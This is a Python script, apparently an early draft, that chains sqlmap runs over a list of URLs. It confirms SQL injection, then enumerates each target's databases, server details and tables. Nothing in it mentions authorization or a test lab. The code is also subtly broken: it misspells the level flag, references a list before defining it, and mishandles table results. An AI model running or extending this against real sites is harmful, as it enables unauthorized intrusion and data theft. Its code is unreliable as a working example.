import subprocess
import os
import csv

# Function which brings in the results data from another script
def import_results_data(path):
    # Opens the file with read
    with open(path, "r") as f:
        # Brings in the data as a list
        data = f.readlines()
    # Returns the data
    return data

# Function to filter out any results which flag a false positive
def filter_results(data):
    # Stores the verified urls
    verified_urls = []
    
    # Loops over the urls in the data
    for url in data:
        # Outputs the url being verifyed
        print(f"Verifying: {url}")
        
        # Runs sqlmap with --batch to skip prompts
        result = subprocess.run([
            "sqlmap", "-u", url, 
            "--batch", 
            "--leval=1", # Keep it fast for verification
            "--flush-session" # Ignore previous results for a clean test
        ], capture_output=True, text=True)

        # Checks the standard output for is vulnerable
        if "is vulnerable" in result.stdout:
            # Outputs the url is confirmed as vulnerable
            print(f"[+] Confirmed: {url}")
            # Adds the url to the verified urls
            verified_urls.append(url)
        else:
            # Ouputs the url was a false positive
            print(f"[-] False Positive: {url}")
    # Returns verified urls
    return verified_urls

# Function to extract the databases
def extract_databases(data):
    # Stores the databases
    databases = []

    # Stores DMBS information
    dbms_info = {}

    # Loops over the data
    for url in data:
        # Runs sqlmap as a subprocess
        database_scan = subprocess.run(["sqlmap", "-u", url, "--dbs"], capture_output=True, text=True)

        # Loops over the split lines of the output
        for line in database_scan.stdout.splitlines():
            # Checks for lines with a database
            if "[*]" in line:
                # Extracts the database from the line
                database = line.split()[-1]

                # Adds to the databases list
                databases.append(database)
            # Checks for the database
            if "web server" in line:
                # Extracts the information
                server_os = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["server_os"] = server_os

            # Checks for web application technology
            if "web application technology" in line:
                # Extracts the information
                technology = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["technology"] = technology

            # Checks for back end dbms
            if "back-end DBMS" in line:
                # Extracts the information
                database_type = line.split(":")[-1]
                # Adds the data to the dbms infromation
                dbms_info["database_system"] = database_type 

    # Creates unique database list
    unique_databases = [database for database in databases if database not in unique_databases]

    # Returns the unique databases
    return unique_databases

# Function to extract the tables
def extract_tables(databases, data):
    # Stores the databases and the tables
    database_tables = {}

    # Loops over the databases and urls
    for url in data:
        for database in databases:
            # Runs sqlmap as a subprocess
            database_scan = subprocess.run(["sqlmap", "-u", url, "-D", database, "--tables", "--flush-session"], capture_output=True, text=True)

            # Loops over the split lines of the output
            for line in database_scan.stdout.splitlines():
                # Creates an emtpty entry  in the dictionary
                database_tables[database] = []

                # Checks for a border in teh line
                if "|" in line:
                    # Splits it at the divider
                    table = line.split("|")
                    # Adds the table to the database
                    database_tables[database] = table[1].strip()

    # Returns the database tables
    return database_tables


'''

example extract function

def extract_tables(url):
    # Define a specific output directory to find files easily
    output_dir = "./sqlmap_results"
    
    # Run sqlmap to enumerate tables
    subprocess.run([
        "sqlmap", "-u", url,
        "--batch",
        "--tables",           
        "--output-dir", output_dir,
        "--flush-session"
    ], capture_output=True)

    # sqlmap saves results in: output_dir/hostname/files/
    # We look for the CSV file it generates
    hostname = url.split("//")[-1].split("/")[0]
    csv_path = f"{output_dir}/{hostname}/csv/tables.csv"
    
    found_tables = []
    
    if os.path.exists(csv_path):
        with open(csv_path, mode='r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                # sqlmap CSVs usually have 'Database' and 'Table' columns
                found_tables.append(row['Table'])
                
    return found_tables
'''